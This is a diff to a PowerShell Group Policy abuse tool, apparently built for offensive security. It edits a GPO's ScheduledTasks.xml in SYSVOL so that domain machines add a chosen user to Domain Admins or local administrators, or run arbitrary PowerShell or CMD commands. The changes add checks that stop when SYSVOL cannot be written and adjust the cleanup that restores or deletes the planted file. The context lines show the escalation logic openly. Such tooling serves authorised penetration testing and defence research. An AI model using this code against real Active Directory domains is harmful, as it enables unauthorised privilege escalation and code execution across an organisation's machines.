@@ -282,6 +282,11 @@ Parameters:
         $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$dacommand"} |
                         Set-Content -Encoding $encoding $xmlfile -Force
         $green+" ScheduledTasks file modified to add $User to the Domain Admins group!"
+        if(-not(Test-Path \\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml)){
+            Write-Host "can't write to SYSVOL, exiting..."
+            Pause
+            exit
+        }
     } elseif($Local){
         if(!$User){
             $User = Read-Host "Supply user to elevate!"
@@ -309,6 +314,11 @@ Parameters:
         $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$localcommand"} |
                     Set-Content -Encoding $encoding $xmlfile -Force
         $green+" ScheduledTasks file modified to add $User to local administrators group on $Computer!"
+        if(-not(Test-Path \\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml)){
+            Write-Host "can't write to SYSVOL, exiting..."
+            Pause
+            exit
+        }
     } else {
         if($SecondTaskXMLPath){
             $pwdd = (Get-Location | Select-Object -ExpandProperty Path)
@@ -361,6 +371,11 @@ Parameters:
         $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","-Command $PowerShell"} |
                     Set-Content -Encoding $encoding $xmlfile -Force
         $green+" ScheduledTasks file modified with the supplied powershell custom command!."
+        if(-not(Test-Path \\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml)){
+            Write-Host "can't write to SYSVOL, exiting..."
+            Pause
+            exit
+        }
     }
 
     # Modify the ScheduledTasks XML file with the provided CMD command
@@ -389,6 +404,11 @@ Parameters:
         $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","/r $CMD; mkdir $tempFile"} |
                     Set-Content -Encoding $encoding $xmlfile -Force
         $green+" ScheduledTasks file modified with the supplied custom command!."
+        if(-not(Test-Path \\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml)){
+            Write-Host "can't write to SYSVOL, exiting..."
+            Pause
+            exit
+        }
     }
 
     # Ensure at least one of the required flags is provided
@@ -517,6 +537,7 @@ Parameters:
         catch{
             $red+" Second Scheduled Task Removal Failed! login to the $dc and check if it's already removed, or remove it manually!."
         }
+    }
         # Reverting the ScheduledTasks.xml to the backup or deletes it 
         Remove-Item "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         if(Get-Item "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old" -ErrorAction SilentlyContinue){
@@ -525,8 +546,9 @@ Parameters:
         } else {
             $green+" File removed from SYSVOL"
         }
-    }
+    
     if($Log){
         Stop-Transcript
     }
 }
+
